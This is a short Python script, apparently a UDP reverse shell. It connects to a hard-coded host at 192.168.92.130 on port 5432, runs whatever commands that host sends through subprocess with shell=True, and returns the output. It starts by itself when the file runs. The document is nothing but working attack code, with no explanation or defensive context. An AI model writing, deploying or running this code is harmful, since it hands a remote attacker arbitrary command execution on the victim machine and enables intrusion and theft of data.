import socket
import subprocess
import os

def reverse_shell():
    host = "192.168.92.130"
    port = 5432
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.connect((host, port))

    while True:
        try:
            data, addr = sock.recvfrom(1024)
            if data.decode("utf-8") == "exit":
                break
            output = subprocess.check_output(data.decode("utf-8"), shell=True)
            sock.sendto(output, addr)
        except Exception as e:
            sock.sendto(str(e).encode("utf-8"), addr)

reverse_shell()
